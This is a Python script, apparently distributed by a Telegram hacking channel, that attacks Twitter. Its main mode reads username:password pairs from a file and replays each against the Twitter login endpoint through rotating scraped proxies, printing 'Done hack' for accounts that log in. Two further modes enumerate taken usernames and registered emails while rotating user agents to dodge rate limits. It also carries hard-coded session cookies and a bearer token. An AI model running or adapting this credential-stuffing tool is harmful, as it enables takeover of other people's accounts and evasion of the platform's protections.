import requests,random,time
from bs4 import BeautifulSoup as BS
from bs4 import BeautifulSoup as bs
print('''
       Telegram  : t.me/givtt                              
''')
print("-------------------------------")
print("""
[1] Checker Account
[2] Checker username
[3] Checker email""")
print("-------------------------------")
mode = input("[?] Enter Mode :")
pp = []
proxy_stats = False
def out():
    print("[+] By king @givt_ops")
    s = input("[+] Enter To exit")
    exit()
def work(username,password):
    headers = {
        "Host":
        "twitter.com",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
        "Accept":
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language":
        "en-US,en;q=0.5",
        "Accept-Encoding":
        "gzip, deflate",
        "Content-Type":
        "application/x-www-form-urlencoded",
        "Content-Length":
        "883",
        "Referer":
        "https://twitter.com/login/error?username_or_email=iidaxe&redirect_after_login=%2F",
        "Origin":
        "https://twitter.com",
        "Upgrade-Insecure-Requests":
        "1",
        "Connection":
        "close",
        "Cookie":
        "guest_id=v1%3A160786096844426536; ct0=f375ba25d23212fb4875567c78c85559; gt=1338092020984901634; _ga=GA1.2.1757115354.1607860959; _gid=GA1.2.2074901737.1607860959; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCNp5%252B1t2AToMY3NyZl9p%250AZCIlYTg4NjkyM2Y4ZjliYTRlNDI0YjY5YjUzNjEzN2IzYTg6B2lkIiVkY2Yy%250AOWIwMjdiMzAxZTBlNjk0ZTJhMzY4YjU2OWU0OQ%253D%253D--8586ae21dab33b86cdad030cbbc67d2b03f8df5c; att=1-GRKaX6DWZrfQzzJwXXLohfAmj0D0f5qOvufFk8KZ; _mb_tk=2a0641b03d3b11eba7aa792fdc775b8f",
    }
    data = f"redirect_after_login=%2F&remember_me=1&authenticity_token=2a0641b03d3b11eba7aa792fdc775b8f&wfa=1&ui_metrics=%7B%22rf%22%3A%7B%22b483b1f0d0fe7378b331b266e8cbeb10ce3f5aea97ab042b54c1d2416a4af874%22%3A0%2C%22bf29327ec04978cb62efef16fb4538e6adb77ad78e1d5b9d62c7f10812fdfb5f%22%3A-1%2C%22aa62df073e0d7a51c13b3f3ac348d75e007bbd612758f874b32fc7555ecbb471%22%3A150%2C%22af46abee465456dbc806def3cc464d73d4b7f9d8c00cbdfee9f1b09e75f7f6c0%22%3A137%7D%2C%22s%22%3A%22Y86C51hSlv_kHr2zmqlncZyjJUatsodm525qJqxL7Kzvcb3q_tnc60l7JwQlPn4uz3GLMAPXcPFKAN9aFSLyblTsZOMDUkKWa-R2eRNSr8QiK6bg2nGQ2H5hrpb_asadnCw6ZsE9bR9XW9tl0I4ruGKHA2DvJqQl4WPN4KLe2gV3zeGTdzxSHJlQtBzBekKY3hSzRzG__kO5knt3A5VEJLtijzOSc8WrN2iUupsY3RjdfjAryXRbkECo4xa9t0ApdrI6qugeLe2kjtXJc004b151n62kdkBVV3To29HkWRPugT1l1suV06lfth8zomhoT4HnPwuU4ZogMBbfMSAtRQAAAXZb--U_%22%7D&session%5Busername_or_email%5D={username}&session%5Bpassword%5D={password}"
    url = 'https://twitter.com/sessions'
    try:
        r1 = requests.session()
        p = random.choice(pp)
        proxy = str(random.choice(p))
        NewProxies = {
            'http': 'http://{}'.format(proxy),
            'https': 'http://{}'.format(proxy)}
        r1.proxies = NewProxies
        response = r1.post(url=url,headers=headers,data=data,allow_redirects=False,timeout=5)
        Soup = BS(response.text, 'html.parser')
        fin = Soup.find('a', href=True)
        error = "https://twitter.com/login?username_disabled=true&redirect_after_login=%2F"
        error2 = f"https://twitter.com/login/error?username_or_email={username}&redirect_after_login=%2F"
        if fin['href'] == "https://twitter.com/":
            print(f"Done hack  --> {username}:{password}")
        elif fin['href'] == error or fin['href'] == error2:
            print(f"[ERR0R] {username}:{password}")
    except Exception as e:
        print(e)

def proxy():
    global proxy_stats
    print("[#] We Get Proxy now ")
    r = requests.Session()
    url = 'https://free-proxy-list.net/'
    try:
        a = r.get(url).text
        b = bs(a, 'html.parser')
        c = b.find("tbody").findAll("tr")
        for pr in c:
            ls = pr.findAll("td")
            sq = ls[0].text + ":" + ls[1].text
            pp.append(sq)
        print("[+] Done get proxy")
        proxy_stats = True
    except:
        print("[X] Use VPN to get Proxy")
        out()

def opshin():
    try:
        f = open("list.txt", "r").read().splitlines()
    except:
        print("[X] File (list.txt) Not Found !")
        time.sleep(50)
        exit()

    print("[***] Use VPN to get proxy !")

    proxy()
    if proxy_stats == True:
        for i in f:
            Acc = str(i)
            username = Acc.split(":")[0]
            password = Acc.split(":")[1]
            work(username=username, password=password)

def checker_username():
    bad = 0
    done = 0
    error = 0
    try:
        f = open("list.txt","r").read().splitlines()
    except:
        print("[X] Not Found file (list.txt)")
        out()
    users = ['Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.01',
             'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
             '54.0.2840.71 Safari/537.36',
             'Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2 Safa'
             'ri/537.36',
             'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.'
             '0.2228.0 Safari/537.36',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko'
             ') Chrome/42.0.2311.135 '
             'Safari/537.36 Edge/12.246',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, '
             'like Gecko) Version/9.0.2 Safari/601.3.9',
             'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
             'Chrome/47.0.2526.111 Safari/537.36',
             'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0',
             'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36']
    userr = random.choice(users)
    for username in f:
        url = "https://api.twitter.com/graphql/P8ph10GzBbdMqWZxulqCfA/UserByScreenName?variables=%7B%22screen_name%22%3A%22" + username + "%22%2C%22withHighlightedLabel%22%3Atrue%7D"
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9,bn;q=0.8",
            'authorization': 'Bearer AAAAAAAAAAAAAedeAAAAAAAANRdeILgAAAAAAdenNwIzUejRCdeOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
            "content-type": "application/json",
            "dnt": "1",
            'origin': 'https://twitter.com',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': userr,
            'x-twitter-active-user': 'yes',
            'x-twitter-client-language': 'en'
        }
        r = requests.get(url, headers=headers)
        if r.text.find("Rate limit exceeded") >= 0:
            bad += 1
            print(f"\r[-]Taken:{error} [+]Done:{done} [-]bad proxy:{bad}", end="")
            time.sleep(10)
        elif r.text.find('NonFatal') >= 0:
            done += 1
            print(f"\r[-]Taken:{error} [+]Done:{done} [-]bad proxy:{bad}", end="")
            print("[+] Done"+username + "\n")
        else:
            error += 1
            print(f"\r[-]Taken:{error} [+]Done:{done} [-]bad proxy:{bad}", end="")

def checker_email():
    error = 0
    users = ['Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.01',
             'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
             '54.0.2840.71 Safari/537.36',
             'Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2 Safa'
             'ri/537.36',
             'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.'
             '0.2228.0 Safari/537.36',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko'
             ') Chrome/42.0.2311.135 '
             'Safari/537.36 Edge/12.246',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, '
             'like Gecko) Version/9.0.2 Safari/601.3.9',
             'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
             'Chrome/47.0.2526.111 Safari/537.36',
             'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0',
             'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36']
    fin = random.choice(users)
    try:
        f = open("list.txt","r").read().splitlines()
    except:
        print("[X] Not Found file (list.txt)")
        time.sleep(50)
        exit()
    for username in f:
        url = f"https://twitter.com/users/email_available?email={username}"
        headers = {"User-Agent":fin}
        try:
            r = requests.get(url,headers=headers)
            e1 = str(r.json()['msg'])
            if e1.find("Available!")>=0:
                print(f"\nDone:{username} | {username}")
            else:
                error+=1
                print(f"\r[X] Error:{error} | {username}")
        except:
            time.sleep(150)


if mode == "1":
    opshin()
elif mode == "2":
    checker_username()
elif mode == "3":
    checker_email()
else:
    out()
